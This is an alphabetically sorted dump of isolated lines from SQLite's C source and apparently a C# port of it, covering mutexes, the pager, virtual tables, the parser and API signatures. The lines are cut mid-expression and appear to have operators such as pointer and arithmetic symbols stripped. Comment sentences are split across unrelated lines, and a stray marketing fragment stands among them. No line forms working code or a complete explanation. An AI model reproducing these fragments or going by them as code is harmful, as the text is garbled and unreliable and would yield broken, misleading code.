pFile.shared.bPending = FALSE
pFile.shared.bPending = TRUE
pFile.shared.bReserved = FALSE
pFile.shared.bReserved = TRUE
pFile.shared.nReaders 
pFile.shared.nReaders --
pFile.zDeleteOnClose = zConverted
pFrom.nCell)
pHash = 
pHighwater and the resetFlag is ignored.
pHighwater are written.
pHighwater is written. Some parameters do not record the highest
pHighwater parameter to [sqlite3_status()] is of interest.  
pHighwater reflect the status of SQLite at different points in time
pHighwater.  If the
pHiwtr.  If
pIdx to refer
pIdxCons
pIdxCons = (sqlite3_index_constraint)pIdxInfo[1]
pIdxCons = pIdxInfo.aConstraint
pIdxCons) 
pIdxCons.usable =  (pTerm.prereqRight 
pIdxCons[j].iColumn = pTerm.u.leftColumn
pIdxCons[j].iTermOffset = i
pIdxCons[j].op = (u8)pTerm.eOperator
pIdxInfo
pIdxInfo = 
pIdxInfo = new sqlite3_index_info()
pIdxInfo)
pIdxInfo.aConstraint = pIdxCons
pIdxInfo.aConstraintUsage =
pIdxInfo.aOrderBy = pIdxOrderBy
pIdxInfo.estimatedCost = SQLITE_BIG_DBL / ((double)2)
pIdxInfo.idxNum = 0
pIdxInfo.idxStr = 0
pIdxInfo.nConstraint = nTerm
pIdxInfo.nConstraint)
pIdxInfo.nOrderBy = 0
pIdxInfo.nOrderBy = nOrderBy
pIdxInfo.needToFreeIdxStr = 0
pIdxInfo.orderByConsumed = 0
pIdxOrderBy
pIdxOrderBy = (sqlite3_index_orderby)pIdxCons[nTerm]
pIdxOrderBy)
pIdxOrderBy[i].desc = pOrderBy.a[i].sortOrder
pIdxOrderBy[i].iColumn = pExpr.iColumn
pInClause->flags 
pInClause->x.pSelect = pSelect
pIndex->aSortOrder[nCol] )
pIndex.zName[nName 
pInfo) 
pInfo))
pItem = pSrcList.a[0]
pItem))
pIter[9]
pKeyDup) 
pKeyDup.aColl[nExpr]
pKeyInfo)
pKeyInfo) 
pKeyInfo.aColl[nField]
pKeyMerge)
pKeyMerge.aColl[nOrderBy]
pLater
pLeft = pExpr.x.pList.a[1].pExpr
pLevel.op = OP_VNext
pLevel.p1 = iCur
pLevel.p2 = sqlite3VdbeCurrentAddr( v )
pLevel.u._in.nIn)
pList = GLOBAL(BtShared
pList = pExpr.x.pList
pList.pNext = pBt.pNext
pList.pageHash = pager_pagehash(pList)
pList=pList.pNext
pLock = (BtLock 
pLock = pIter
pLock.eLock = READ_LOCK
pLock.eLock = eLock
pLock.iTable = iTable
pLock.pBtree = p
pLock.pNext
pLock.pNext = pBt.pLock
pLock=null
pMask)
pMaster = sqlite3MutexAlloc(SQLITE_MUTEX_STATIC_MASTER)
pMem = 
pMem describes as an integer.
pMem->n 
pMem.enc = bom
pMem.flags 
pMem.flags = (u16)( pMem.flags 
pMem.n 
pMem.n -= 2
pMem.u.i = 0
pMem.z = null
pMem.zBLOB = Encoding.UTF8.GetBytes( pMem.z )
pMem.z[sizeof( VdbeCursor ) 
pMem.z[sizeof( VdbeCursor )]
pMethods
pMod
pMod.xDestroy(pMod.pAux)
pMod[1])
pModulE.xClose(pVtabCursor)
pModule
pModule = (sqlite3_module 
pModule = pVtab.pModule
pModule.xClose(pVtabCursor)
pModuleName    /
pModuleName->z[pModuleName->n] - pName1->z)
pNC.nErr
pNC.pParse.nHeight -= pExpr.nHeight
pNC.pParse.nHeight) ){
pNRec and 
pNRec is set to the number of
pName
pName = 
pNew
pNew = 
pNew = (void 
pNew = 0
pNew = sqlite3Malloc(sizeof(
pNew)
pNew) )
pNew))
pNew->cnt = 0
pNew->id = id
pNew->zName[16]
pNewTerm = pWC.a[idxNew]
pNewTerm.eOperator = WO_MATCH
pNewTerm.iParent = idxTerm
pNewTerm.leftCursor = pLeft.iTable
pNewTerm.prereqAll = pTerm.prereqAll
pNewTerm.prereqRight = prereqExpr
pNewTerm.u.leftColumn = pLeft.iColumn
pNew[1]
pNext
pNext = p->pNext
pNext = pVTable->pNext
pNextBlocked
pNotifyArg                            /
pNum = neg 
pOffset
pOffset has already been played back
pOffset into the file. The 
pOffset page is set
pOld
pOld[1]
pOp = p.aOp[0]
pOp->p1 = pOut->n
pOp->p4.z = pOut->z
pOp->p4type = P4_DYNAMIC
pOp.cnt
pOp.cnt = 0
pOp.cycles 
pOp.cycles = 0
pOrInfo))
pOrderBy
pOut->flags 
pOut->zMalloc = 0
pOutFlags may be set.
pOutFlags to
pOutFlags)
pOvfl.aData[4]
pPage.aData[pBt.pageSize]
pPage.aData[pBt.usableSize]
pPage.aData[pBt.usableSize])
pPage.pageHash = pager_pagehash(pPage)
pPageSize) is valid (a power
pPageSize.
pPage[1]
pPage[1] )
pPager)
pPager)) 
pPager)))
pPager){
pPager->pCodec = pCodec
pPager->xCodec = xCodec
pPager->xCodecFree = xCodecFree
pPager->xCodecSizeChng = xCodecSizeChng
pPager.pageSize bytes). If the file
pParent.aData[pParent.hdrOffset 
pParse
pParse)
pParse))
pParse){
pParse->rc = SQLITE_AUTH
pParse->rc = SQLITE_ERROR
pParse->sArg
pParse->sNameToken)
pParse->zAuthContext = zContext
pParse->zAuthContext)
pParse.aAlias = new int[pParse.nAlias]
pParse.aAlias[iAlias - 1] = iReg
pParse.aTableLock = null
pParse.aTableLock[pParse.nTableLock] = new TableLock()
pParse.db.aDbStatic[0].pSchema.enc = encnames[iEnc].enc != 0 
pParse.db.aDb[iDb].zName ) ){
pParse.db.mallocFailed = 1
pParse.nAlias )
pParse.nAliasAlloc = pParse.nAlias
pParse.nHeight 
pParse.nMem
pParse.nMem 
pParse.nMem )
pParse.nTableLock = 0
pParse.nVar
pParse.nVtabLock = 0
pParse.parseError = 1
pParser.yyidxMax=0
pParser.yystack = NULL
pParser.yystack = null
pParser.yystksz = 0
pPg into the sub-journal.
pPg.pageHash = pager_pagehash(pPg)
pPg.pageHash==pager_pagehash(pPg) )
pQuery
pQuery = 
pQuery[1]
pRC = SQLITE_CORRUPT_BKPT
pRes a number
pResOut)
pRet = 0
pRight = pExpr.x.pList.a[0].pExpr
pRowid)
pRowid.  Return 1 on success.  Return
pSchema = pTab->pSchema
pSib = pSib.pNext
pSib.pNext = p
pSib.pPrev = p
pSize = (sqlite_int64) p.iSize
pSize)
pSpace[4]
pSrc) 
pSrc))/sizeof(pSrc->a[0])
pStack = pParse->trigStack
pStmt
pStmt)
pStr2->token.z[nPattern-1]
pTab
pTab = 0
pTab = pParse->pNewTable
pTab = pSrc.pTab
pTab = pStack->pTab
pTab){
pTab->pTrigger 
pTabList     /
pTabList = null
pTable
pTable->nModuleArg)
pTerm
pTerm = pWC.a[idxTerm]
pTerm = pWC.a[j]
pTerm.nChild = 1
pTerm.wtFlags 
pTm)
pToken - z[1])
pTriggerStep[1]
pTstAlloc = sqlite3Malloc(10)
pUnlockArg
pUnlockConnection
pUsage
pUsage = (sqlite3_index_constraint_usage)pIdxOrderBy[nOrderBy]
pUsage = pIdxInfo.aConstraintUsage
pUsage))
pUsage[i] = new sqlite3_index_constraint_usage()
pUserData
pVTab = (const char
pVTab = (const char 
pVTab = db->aVTrans[i]
pVTab = pOp.p4.pVtab
pVTab)
pVTab){
pVTab.pVtab.zErrMsg = null
pVTable
pVTable = p->pVTable
pVal = sqlite3ValueNew(0)
pValue)
pVdbe = sqlite3GetVdbe( pParse )
pVtab
pVtab = aVTrans[i]->pVtab
pVtab = pC.pVtabCursor.pVtab
pVtab = pCur.pVtabCursor.pVtab
pVtab = pOp.p4.pVtab.pVtab
pVtab = pVtabCursor.pVtab
pVtab.zErrMsg = 0
pVtabCursor
pVtabCursor = 0
pVtabCursor = pCur.pVtabCursor
pVtabCursor.pVtab = pVtab
pVtabIdx.aConstraint
pVtabIdx.aConstraintUsage
pVtabIdx.needToFreeIdxStr 
pVtabIdx.needToFreeIdxStr = 0
pWC.a[iTerm] )
pWC.nSlot
pWC.nTerm)
pWC.vmask 
pWInfo.a[j].pIdxInfo
pWhere = null
pX = 
p[1]
pagerReportSize(pPager)
pazResult = null
pazResult = res.azResult
pazResult is held in memory obtained
pc = pOp.p2 - 1
pcache1EnterMutex()
pcache1FreePage(p)
pcache1LeaveMutex()
pcache1PinPage(p)
pcache1RemoveFromHash(p)
persist
pnByte 
pnByte by the amount of the request.
pnByte is a counter of the number of bytes of space that have failed
pnColumn = 0
pnColumn = res.nColumn
pnEntry
pnEntry 
pnPage 
pnPage is left unchanged.
pnPage is set to the number of pages in the database.
pnRow = 0
pnRow = res.nRow
pp != pTrigger 
pp = 
pp = (
pp = db
pp = p
pp = p->pNextBlocked
pp point to the
pp should initially
pp to point to allocated buffer 
pp)->pNext
pp)->pNext ) ) 
pp)->pNextBlocked
pp)->pNextBlocked){
pp)->xUnlockNotify!=db->xUnlockNotify
pp==db ){
ppArg)
ppBlob
ppBlob   /
ppBlob = 0
ppBlob is set
ppBlob variable is always initialized in a
ppBlob. Otherwise an [error code] is returned and 
ppBtree)
ppCursor)
ppDb
ppDb 
ppDb          /
ppDb = 0
ppDb instead of a pointer to the [sqlite3]
ppDb) = SQLITE_UTF16NATIVE
ppFrom
ppFrom 
ppFrom buffer 
ppFrom point to available space and pEnd points to the end of the
ppFrom to satisfy the
ppFrom) )
ppFrom)[nByte] <= pEnd ){
ppIdxInfo
ppIdxInfo  /
ppIter )
ppIter = 
ppIter = pLock.pNext
ppList set to NULL.
ppList to point to the unused elements of the list.  If the input
ppList.  A depth of 2 means a tree with
ppPage and SQLITE_OK returned.
ppPage is set to NULL.
ppPager is set to NULL
ppPager set to point to
ppPager. The pager should eventually be freed by passing it
ppStmt = 0
ppStmt is left pointing to a compiled [prepared statement] that can be
ppStmt is set
ppStmt is set to NULL.
ppStmt==0 )
prNotFound is left unchanged.
prNotFound. If there is no chance that the b-tree contains a
pragma warn -aus /
pragma warn -ccc /
pragma warn -csu /
pragma warn -rch /
pragma warn -spa /
prepare)(sqlite3
prepare16)(sqlite3
prepare16_v2)(sqlite3
prepare_v2)(sqlite3
prevcode = 0
prevcode = code
primary_key_exit:
primarykey  = pCol->isPrimKey!=0
primarykey = 1
profile)(sqlite3
progress_handler)(sqlite3
public   sqlite3 db
public   u8 isHidden
public BtLock pLock
public BtShared pNext
public Btree pWriter
public Int32 _n
public Int32 n
public Pgno[] aOverflow
public TableLock[] aTableLock
public Table[] apVtabLock
public Token sArg
public WhereTerm[] aStatic = new WhereTerm[1]
public bool dyn
public bool isIncrblobHandle
public class TableLock
public dxAuth xAuth
public i64 _i
public i64 i
public int _p1
public int _p2
public int _p3
public int cnt
public int iDb
public int iTab
public int iValue
public int nAlloc
public int nColumn
public int nData
public int nRef
public int nResult
public int nRow
public int nTableLock
public int nVtabLock
public int op
public int p1
public int p2
public int p3
public int rc
public int yystksz
public object pAuthArg
public readonly sqlite3_module pModule
public sqlite3_vtab_cursor pVtabCursor
public static bool ISAUTOVACUUM =false
public static int sqlite3_get_table(
public static int sqlite3_prepare16(
public static int sqlite3_prepare16_v2(
public string _z
public string _zToken
public string z
public string zErrMsg
public string zName
public string zToken
public string[] azResult
public struct Incrblob
public struct _u
public u16 _flags
public u16 flags
public u64 cycles
public u8 _op
public u8 declareVtab
public u8 isExclusive
public u8 isPending
public u8 isWriteLock
public u8 op
public yyStackEntry 
pxFunc)(sqlite3_context
pzBuffer is assumed to point to a buffer large enough
pzBuffer is set to the first byte passed the
pzErr
pzErr is set to point an an English language
pzErr){
pzErr.
pzErrMsg       /
pzErrMsg with error message text stored in memory
pzErrmsg       /
pzErrmsg = pVtab->zErrMsg
pzErrmsg to point to a buffer that should be released using 
pzErrmsg)
pzErrmsg){
pzNext = zIn
pzTail     /
pzTail is left pointing to
pzTail is made to point to the first byte
r' )
rc =  SQLITE_CORRUPT_BKPT
rc = SQLITE_CORRUPT_BKPT
rc = SQLITE_DENY
rc = SQLITE_ERROR
rc = SQLITE_IOERR_SHORT_READ
rc = SQLITE_LOCKED
rc = SQLITE_LOCKED_SHAREDCACHE
rc = SQLITE_NOMEM
rc = SQLITE_OK
rc = createFile(p)
rc = isnan(x)
rc = pModulE.xNext(pCur.pVtabCursor)
rc = restoreCursorPosition(pCsr)
rc = sContext.isError
rc = sqlite3Fts1Init(db)
rc = sqlite3Fts2Init(db)
rc = sqlite3Fts3Init(db)
rc = sqlite3GlobalConfig.mutex.xMutexEnd()
rc = sqlite3IcuInit(db)
rc = sqlite3JournalCreate(pPager.jfd)
rc = sqlite3JournalOpen(
rc = sqlite3RtreeInit(db)
rc = sqlite3VdbeMemMakeWriteable(pMem)
rc = sqlite3_complete(zSql8)
rc = sqlite3_initialize()
rdtsc
realloc)(void
realnum is
realnum to FALSE.  Note that just becaue 
realnum to TRUE if the string
realnum unchanged if the string contains any character which is not
ref iDummy )
ref int pAutoinc       /
ref proxy_file_path )
ref string azResult            /
ref string pzErrMsg       /
ref string pzTail         /
ref string pzTail        /
releasePage(pPage)
release_memory)(int)
removeFromBlockedList(db)
removed = true
res = 0
res = pModulE.xEof(pCur.pVtabCursor)
res = pModulE.xEof(pVtabCursor)
res.azResult = new string[res.nAlloc]
res.azResult[0] = null
res.nAlloc = 20
res.nAlloc = res.nData
res.nColumn = 0
res.nData = 1
res.nResult = 0
res.nRow = 0
res.rc = SQLITE_OK
reset)(sqlite3_stmt
result)
result_blob)(sqlite3_context
result_double)(sqlite3_context
result_error)(sqlite3_context
result_error16)(sqlite3_context
result_error_code)(sqlite3_context
result_error_nomem)(sqlite3_context
result_error_toobig)(sqlite3_context
result_int)(sqlite3_context
result_int64)(sqlite3_context
result_null)(sqlite3_context
result_text)(sqlite3_context
result_text16)(sqlite3_context
result_text16be)(sqlite3_context
result_text16le)(sqlite3_context
result_value)(sqlite3_context
result_zeroblob)(sqlite3_context
ret       
return
return 
return  sqlite3GlobalConfig.mutex.xMutexAlloc( id )
return  sqlite3GlobalConfig.mutex.xMutexTry( p )
return ( p == null 
return (int)(z-(unsigned char const 
return (p->sharable==0 
return (p==null 
return (pVfs->szOsFile
return (sqlite_u3264)hi << 32 
return (void
return (void 
return 0
return 1
return 4
return 5
return BTREE_AUTOVACUUM_NONE
return FALSE
return JOURNAL_HDR_SZ(pPager) 
return SQLITE_ABORT
return SQLITE_CANTOPEN
return SQLITE_CONSTRAINT
return SQLITE_CORRUPT_BKPT
return SQLITE_CORRUPT_BKPT()
return SQLITE_ERROR
return SQLITE_LOCKED_SHAREDCACHE
return SQLITE_MISUSE
return SQLITE_NOMEM
return SQLITE_OK
return SQLITE_READONLY
return TRUE
return Thread.CurrentThread.ManagedThreadId
return WRC_Prune
return bReturn
return columnName(
return createFile((JournalFile 
return db != null 
return hash
return iReg
return location
return m.z
return n
return nFree
return nRet
return null
return osType==2
return p
return p.nRef!=0 
return p.nRef==0 
return p==0 
return pIdxInfo
return pInClause
return pNew
return pPager->pCodec
return pParse.nErr
return pParser.yyidxMax
return pWhere
return rc
return removed
return res.rc
return retval
return true
return val
return yy_default[stateno]
return z
rollback_hook)(sqlite3
rowid)
rowid.
s leading software development platform 
s3 ) 
sArg = SaveBuf[nested].sArg              
sArg = new Token()
sInfo)
sInfo.dwOSVersionInfoSize = sizeof(sInfo)
sMutex
scratch_overflow:
select_end:
set { _flags = value
set { _i = value
set { _n = value
set { _op = value
set { _p1 = value
set { _p2 = value
set { _p3 = value
set { _z = value
set { _zToken = value
set_authorizer)(sqlite3
set_auxdata)(sqlite3_context
shared
size>usableSize ){
sizeof(
sizeof(Bitvec
sizeof(JournalFile))
sizeof(MemPage
sizeof(const char
sizeof(db.aDb[0]))
sizeof(db.aDb[j]))
sizeof(p.aCol[0]))
sizeof(p.aLabel[0]))
sizeof(p.a[0]) )
sizeof(pFKey.aCol[0]) 
sizeof(pKeyInfo.aColl[0]) 
sizeof(pList.a[0]))
sizeof(pNew[0]))
sizeof(pParse->apVtabLock[0])
sizeof(pParse.aAlias[0]))
sizeof(pParse.apVarExpr[0])
sizeof(pRoot.aOvfl[0]))
sizeof(pSrc.a[0]) )
sizeof(sCheck.anRef[0]) )
sizeof(struct _ht) )
sizeof(struct _ht))
sizeof(struct _ht)>SQLITE_MALLOC_SOFT_LIMIT ){
sizeof(u16)                       /
sizeof(u32)))/sizeof(Bitvec
sizeof(u8
sizeof(void 
sizeof(wsdAutoext.aExt[0])
sizeof(zMbcsFilename[0]) )
sizeof(zTemp[0]) )
sizeof(zWideFilename[0]) )
sleep)(int)
soft_heap_limit)(int)
sql)
sql)(sqlite3_stmt
sqlite3 
sqlite3 db
sqlite3 db = (sqlite3)ptr
sqlite3 db = pParse.db
sqlite3 pBlock = pBt.pWriter.db
sqlite3ArrayAllocate(sqlite3
sqlite3AuthContextPop( sContext )
sqlite3AuthContextPop(sContext)
sqlite3AutoExtList 
sqlite3BeginBenignMalloc()
sqlite3BinaryCompareCollSeq(Parse 
sqlite3BitvecCreate(u32)
sqlite3BlockedList
sqlite3BtreeCommitPhaseTwo(p.pSrc)
sqlite3BtreeDataFetch(BtCursor
sqlite3BtreeEnter(p)
sqlite3BtreeEnter(pCur->pBtree)
sqlite3BtreeEnterAll(db)
sqlite3BtreeEnterAll(p.db)
sqlite3BtreeGetFilename(Btree )
sqlite3BtreeGetJournalname(Btree )
sqlite3BtreeIntegrityCheck(Btree
sqlite3BtreeKeyFetch(BtCursor
sqlite3BtreeLeave(p)
sqlite3BtreeLeave(pCur->pBtree)
sqlite3BtreeLeaveAll(db)
sqlite3BtreeMutexArrayEnter(
sqlite3BtreePager(Btree
sqlite3ConnectionUnlocked(db)
sqlite3CreateIdExpr(Parse 
sqlite3DbMallocRaw(sqlite3
sqlite3DbMallocZero(sqlite3
sqlite3DbRealloc(sqlite3 
sqlite3DbReallocOrFree(sqlite3 
sqlite3DbStrDup(sqlite3
sqlite3DbStrNDup(sqlite3
sqlite3DbStrNDup(sqlite3 
sqlite3DefaultMutex(void)
sqlite3DefaultMutex(void){
sqlite3Dequote(ref pNew.u._zToken)
sqlite3EndBenignMalloc()
sqlite3ErrStr(int)
sqlite3ExpirePreparedStatements(db)
sqlite3Expr(sqlite3
sqlite3ExprAlloc(sqlite3
sqlite3ExprAnd(sqlite3
sqlite3ExprDup(sqlite3
sqlite3ExprFunction(Parse
sqlite3ExprListAppend(Parse
sqlite3ExprListDup(sqlite3
sqlite3FindCollSeq(sqlite3
sqlite3FindFunction(sqlite3
sqlite3FindIndex(sqlite3
sqlite3FindTable(sqlite3
sqlite3GetCollSeq(sqlite3
sqlite3GetVTable(sqlite3
sqlite3GetVTable(sqlite3 
sqlite3GetVdbe(Parse
sqlite3GlobalConfig.bCoreMutex = false
sqlite3GlobalConfig.bCoreMutex = true
sqlite3GlobalConfig.bFullMutex = false
sqlite3GlobalConfig.bFullMutex = true
sqlite3GlobalConfig.m = 
sqlite3GlobalConfig.mutex = 
sqlite3GlobalConfig.mutex = ap
sqlite3GlobalConfig.mutex.xMutexEnter( p )
sqlite3GlobalConfig.mutex.xMutexFree( p )
sqlite3GlobalConfig.mutex.xMutexLeave( p )
sqlite3GlobalConfig.sharedCacheEnabled = enable
sqlite3HashClear(
sqlite3HashFind(const Hash
sqlite3HashInit( ref db.aModule )
sqlite3HashInsert(Hash
sqlite3HexToBlob(sqlite3
sqlite3IdListAppend(sqlite3
sqlite3IdListDup(sqlite3
sqlite3IndexKeyinfo(Parse 
sqlite3IoTrace)(const char
sqlite3LimitWhere(Parse 
sqlite3LocateCollSeq(Parse 
sqlite3LocateTable(Parse
sqlite3MAppendf(sqlite3
sqlite3MPrintf(sqlite3
sqlite3Malloc(int)
sqlite3MallocZero(int)
sqlite3MemGetMemsys3()
sqlite3MemGetMemsys3(void)
sqlite3MemGetMemsys5()
sqlite3MemGetMemsys5(void)
sqlite3MutexAlloc(int)
sqlite3NameFromToken(sqlite3
sqlite3OpcodeName(int)
sqlite3OsClose(p.pReal)
sqlite3OsDlOpen(sqlite3_vfs 
sqlite3OsDlSym(sqlite3_vfs 
sqlite3PExpr(Parse
sqlite3PageMalloc(int)
sqlite3PagerBackupPtr(Pager
sqlite3PagerFile(Pager
sqlite3PagerFilename(Pager
sqlite3PagerGetCodec(Pager 
sqlite3PagerGetData(DbPage 
sqlite3PagerGetExtra(DbPage 
sqlite3PagerJournalname(Pager
sqlite3PagerLookup(Pager 
sqlite3PagerStats(Pager
sqlite3PagerTempSpace(Pager
sqlite3PagerVfs(Pager
sqlite3ParserAlloc(void
sqlite3ParserStackPeak(pEngine)
sqlite3PcacheDirtyList(PCache
sqlite3Realloc(void
sqlite3ResultSetOfSelect(Parse
sqlite3RowSetClear(pMem.u.pRowSet)
sqlite3RowSetInit(sqlite3
sqlite3SafetyOff(p.db)
sqlite3SafetyOn(p.db)
sqlite3SchemaGet(sqlite3 
sqlite3ScratchMalloc(int)
sqlite3SelectDelete(pSelect)
sqlite3SelectDup(sqlite3
sqlite3SelectNew(Parse
sqlite3SrcListAppend(sqlite3
sqlite3SrcListAppendFromTerm(Parse
sqlite3SrcListDup(sqlite3
sqlite3SrcListEnlarge(sqlite3
sqlite3SrcListLookup(Parse
sqlite3StrAccumFinish(StrAccum
sqlite3TestTextToPtr(const char
sqlite3TriggerDeleteStep(sqlite3
sqlite3TriggerInsertStep(sqlite3
sqlite3TriggerList(Parse 
sqlite3TriggerSelectStep(sqlite3
sqlite3TriggerUpdateStep(sqlite3
sqlite3TriggersExist(Parse 
sqlite3Utf16to8(sqlite3 
sqlite3VMPrintf(sqlite3
sqlite3ValueFree(pVal)
sqlite3ValueFree(ref pTmp)
sqlite3ValueNew(sqlite3 
sqlite3ValueText(sqlite3_value
sqlite3VdbeChangeEncoding(
sqlite3VdbeCreate(sqlite3
sqlite3VdbeDb(Vdbe
sqlite3VdbeGetOp(Vdbe
sqlite3VdbeIntValue( pIn1 ) )
sqlite3VdbeMemExpandBlob(P):0)
sqlite3VdbeMemMove(
sqlite3VdbeMemRelease(pMem)
sqlite3VdbeMemSetNull(pDest)
sqlite3VdbeRecordUnpack(KeyInfo
sqlite3VtabOverloadFunction(
sqlite3VtabOverloadFunction(sqlite3 
sqlite3WhereBegin(Parse
sqlite3_activate_cerod(
sqlite3_activate_see(
sqlite3_aggregate_context(sqlite3_context
sqlite3_api = 0
sqlite3_backup_init(
sqlite3_bind()].  A zero
sqlite3_bind_parameter_name(sqlite3_stmt
sqlite3_callback)(void
sqlite3_column_blob(sqlite3_stmt
sqlite3_column_database_name(sqlite3_stmt
sqlite3_column_database_name16(sqlite3_stmt
sqlite3_column_decltype(sqlite3_stmt
sqlite3_column_decltype16(sqlite3_stmt
sqlite3_column_name(sqlite3_stmt
sqlite3_column_name16(sqlite3_stmt
sqlite3_column_origin_name(sqlite3_stmt
sqlite3_column_origin_name16(sqlite3_stmt
sqlite3_column_table_name(sqlite3_stmt
sqlite3_column_table_name16(sqlite3_stmt
sqlite3_column_text(sqlite3_stmt
sqlite3_column_text16(sqlite3_stmt
sqlite3_column_value(sqlite3_stmt
sqlite3_commit_hook(sqlite3
sqlite3_context sContext
sqlite3_context_db_handle(sqlite3_context
sqlite3_db_handle(sqlite3_stmt
sqlite3_db_mutex(sqlite3
sqlite3_destructor_type)(void
sqlite3_errmsg(sqlite3
sqlite3_errmsg16(sqlite3
sqlite3_errmsg16(sqlite3 
sqlite3_file 
sqlite3_file pFile = HANDLE_TO_WINFILE(phFile)
sqlite3_file pFile = sqlite3PagerFile( pPager )
sqlite3_file pReal
sqlite3_file pReal = (sqlite3_file 
sqlite3_get_auxdata(sqlite3_context
sqlite3_index_constraint_usage
sqlite3_index_info 
sqlite3_index_info p = null
sqlite3_index_info pVtabIdx = pLevel.plan.u.pVtabIdx
sqlite3_int64 t64
sqlite3_io_methods pMethod
sqlite3_libversion(void)
sqlite3_malloc(int)
sqlite3_module 
sqlite3_mprintf(const char
sqlite3_mutex 
sqlite3_mutex mutex
sqlite3_mutex mutex = ( (Vdbe)pStmt ).db.mutex
sqlite3_mutex mutex = sqlite3MutexAlloc( SQLITE_MUTEX_STATIC_MASTER )
sqlite3_mutex mutex = sqlite3MutexAlloc( SQLITE_MUTEX_STATIC_PRNG )
sqlite3_mutex mutex = sqlite3MutexAlloc(SQLITE_MUTEX_STATIC_MASTER)
sqlite3_mutex mutex = v.db.mutex
sqlite3_mutex p
sqlite3_mutex pMaster
sqlite3_mutex_alloc(int)
sqlite3_mutex_enter(db->mutex)
sqlite3_mutex_enter(db.mutex)
sqlite3_mutex_enter(mutexOpen)
sqlite3_mutex_enter(mutexShared)
sqlite3_mutex_enter(p->pBt->mutex)
sqlite3_mutex_enter(pMaster)
sqlite3_mutex_enter(sqlite3MutexAlloc(SQLITE_MUTEX_STATIC_MASTER))
sqlite3_mutex_free(pBt.mutex)
sqlite3_mutex_leave(db->mutex)
sqlite3_mutex_leave(db.mutex)
sqlite3_mutex_leave(mutexOpen)
sqlite3_mutex_leave(mutexShared)
sqlite3_mutex_leave(p->pBt->mutex)
sqlite3_mutex_leave(pMaster)
sqlite3_mutex_leave(sqlite3MutexAlloc(SQLITE_MUTEX_STATIC_MASTER))
sqlite3_mutex_methods 
sqlite3_mutex_methods p = sqlite3DefaultMutex()
sqlite3_mutex_methods pTo = sqlite3GlobalConfig.mutex
sqlite3_next_stmt(sqlite3 
sqlite3_profile(sqlite3
sqlite3_realloc(void
sqlite3_rollback_hook(sqlite3
sqlite3_sql(sqlite3_stmt 
sqlite3_step(pStmt)
sqlite3_stmt pStmt
sqlite3_temp_directory
sqlite3_temp_directory = 0
sqlite3_trace(sqlite3
sqlite3_update_hook(
sqlite3_user_data(sqlite3_context
sqlite3_value pTmp = sqlite3ValueNew(db)
sqlite3_value pVal
sqlite3_value[] argv
sqlite3_value_blob(sqlite3_value
sqlite3_value_text(sqlite3_value
sqlite3_value_text16(sqlite3_value
sqlite3_value_text16be(sqlite3_value
sqlite3_value_text16le(sqlite3_value
sqlite3_vfs pVfs
sqlite3_vfs_find(const char 
sqlite3_vmprintf(const char
sqlite3_vtab 
sqlite3_vtab pVtab
sqlite3_vtab pVtab = pOp.p4.pVtab.pVtab
sqlite3_vtab_cursor 
sqlite3_vtab_cursor pVtabCursor = pCx.pVtabCursor
sqlite3_win32_mbcs_to_utf8(string zFilename){
sqlite3_wsd_find(void 
sqlite3one)==0)
sqlite3one)==1)
sqliteAuthBadReturnCode(pParse)
sqlite_int64 iOfst     /
sqlite_int64 rowid
start = sqlite3Hwtime()
static BOOL winceLockFile(
static BOOL winceLockFileEx(
static BOOL winceUnlockFile(
static BtShared 
static Pgno sqlite3PagerPagenumber( DbPage pPg )    {      return pPg.pgno
static VTable 
static bool ALWAYS<T>( T X ) { return true
static bool IsVirtual( Column X) { return X.isHidden!=0
static bool IsVirtual( Table X) { return (X.tabFlags 
static bool NEVER(bool X) { return X
static bool NEVER<T>(T X) { return false
static bool SQLite3IoTrace = false
static bool cursorHoldsMutex(BtCursor p) { return true
static bool sqlite3BtreeCursorIsValid(BtCursor pCur) { return true
static bool sqlite3BtreeTrace=false
static bool sqlite3PagerIswriteable( DbPage pPg ) { return true
static bool sqlite3SafetyOff( sqlite3 db ) { return false
static bool sqlite3SafetyOn( sqlite3 db ) {return false
static bool sqlite3VtabInSync( sqlite3 db ) { return ( db.nVTrans > 0 
static bool sqlite3_mutex_held( sqlite3_mutex p )
static bool sqlite3_mutex_notheld( sqlite3_mutex p )
static byte NEVER(byte X) { return X
static const sqlite3_mem_methods defaultMethods = {
static const u16 misuse[] = {
static const u16 outOfMem[] = {
static const u8 trans[2][3] = {
static const unsigned char iCode[] = {
static int GetCurrentThreadId()
static int NEVER(int X) { return X
static int addToVTrans(sqlite3 
static int checkSavepointCount( sqlite3 db ) { return 1
static int countWriteCursors(BtShared pBt) { return -1
static int createFile(JournalFile p){
static int createModule(
static int debugMutexEnd(void){ return SQLITE_OK
static int debugMutexHeld(sqlite3_mutex 
static int debugMutexInit(void){ return SQLITE_OK
static int debugMutexNotheld(sqlite3_mutex 
static int debugMutexTry(sqlite3_mutex 
static int dummy = 0
static int hasSharedCacheTableLock(
static int isMatchOfColumn(
static int jrnlBufferSize(Pager 
static int jrnlClose(sqlite3_file pJfd){
static int jrnlRead(
static int jrnlWrite(
static int mutexIsNT(void){
static int noopMutexEnd(void){ return SQLITE_OK
static int noopMutexHeld(sqlite3_mutex 
static int noopMutexInit(void){ return SQLITE_OK
static int noopMutexNotheld(sqlite3_mutex 
static int noopMutexTry(sqlite3_mutex 
static int osType = 0
static int pcacheCheckSynced(PCache pCache){
static int ptrmapCheckPages(MemPage 
static int sqlite3MemInit(object NotUsed){ return SQLITE_OK
static int sqlite3MemRoundup(int n){ return n
static int sqlite3MemSize(object pPrior){ return 0
static int sqlite3MutexEnd()
static int sqlite3MutexInit()
static int sqlite3Prepare16(
static int sqlite3VdbeMemExpandBlob( Mem pMem )
static int sqlite3VdbeMemHandleBom(Mem pMem){
static int sqlite3_bind_text16(
static int sqlite3_create_function16(
static int sqlite3_mutex_try( sqlite3_mutex p )
static int sqlite3_os_type = 0
static int vtabBestIndex(Parse 
static int vtabCallConstructor(
static int winMutexEnd(void){
static int winMutexHeld(sqlite3_mutex p){
static int winMutexInit(void){
static int winMutexNotheld(sqlite3_mutex p){
static int winMutexTry(sqlite3_mutex p){
static int winMutex_isInit = 0
static long InterlockedIncrement(long location)
static long winMutex_lock = 0
static sqlite3 
static sqlite3_index_info 
static sqlite3_mutex 
static sqlite3_mutex aStatic[6]
static sqlite3_mutex sqlite3MutexAlloc( int id )
static sqlite3_mutex sqlite3_mutex_alloc( int id )
static sqlite3_mutex winMutex_staticMutexes[6]
static sqlite3_mutex_methods sMutex = {
static sqlite_u3264 g_elapsed
static sqlite_u3264 g_start
static string  sqlite3_value_text16be(sqlite3_value pVal){
static string sqlite3_value_text16(sqlite3_value pVal){
static string sqlite3_value_text16le(sqlite3_value pVal){
